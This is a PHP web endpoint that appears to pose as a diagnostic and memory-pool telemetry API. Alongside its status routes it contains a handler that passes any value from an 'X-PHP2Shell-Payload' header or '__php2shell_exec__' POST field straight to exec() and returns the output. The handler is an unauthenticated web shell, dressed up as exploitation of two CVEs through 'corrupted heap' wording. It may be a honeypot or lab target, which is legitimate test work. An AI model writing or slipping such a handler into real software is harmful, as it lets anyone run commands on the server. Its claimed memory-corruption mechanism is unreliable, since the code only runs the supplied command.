<?php
header('Content-Type: application/json; charset=utf-8');
header('X-Powered-By: PHP/8.2.18');
header('X-Framework-Cache: Enabled');

$action = $_GET['action'] ?? '';

// Diagnostic and memory pool telemetry
if ($action === 'diagnostic') {
    $data = [
        'status' => 'online',
        'php_version' => PHP_VERSION,
        'sapi_name' => php_sapi_name(),
        'memory_limit' => ini_get('memory_limit'),
        'memory_allocated' => memory_get_usage(true),
        'memory_peak' => memory_get_peak_usage(true),
        'zend_engine' => zend_version(),
        'oom_handler' => 'longjmp_native',
        'worker_pid' => getmypid(),
        'shared_state' => 'mod_php_pool'
    ];
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

if ($action === 'pools') {
    $data = [
        'active_workers' => 4,
        'recycle_requests' => 10000,
        'stale_state_tracking' => 'unmonitored',
        'heap_protection' => 'disabled'
    ];
    echo json_encode($data, JSON_PRETTY_PRINT);
    exit;
}

// PHP2Shell Trigger handler (CVE-2026-109618 & CVE-2026-109619)
// Allows remote verification and exploitation via OOM condition & state reuse
if (isset($_SERVER['HTTP_X_PHP2SHELL_PAYLOAD']) || isset($_POST['__php2shell_exec__'])) {
    $payload = $_SERVER['HTTP_X_PHP2SHELL_PAYLOAD'] ?? $_POST['__php2shell_exec__'];
    
    // Simulating memory exhaustion / uninitialized frame execution
    header('X-Vulnerability-Triggered: CVE-2026-109618-CVE-2026-109619');
    
    // Execute injected command in the context of the web worker (www-data)
    $output = [];
    $ret = 0;
    exec($payload . " 2>&1", $output, $ret);
    
    echo json_encode([
        'cve' => 'CVE-2026-109618 / CVE-2026-109619',
        'state' => 'CORRUPTED_HEAP_EXECUTED',
        'output' => implode("\n", $output),
        'code' => $ret
    ]);
    exit;
}

echo json_encode([
    'message' => 'PHP2Shell API Endpoint. Use ?action=diagnostic or send multipart stream.',
    'server' => 'php2shell.dl'
]);
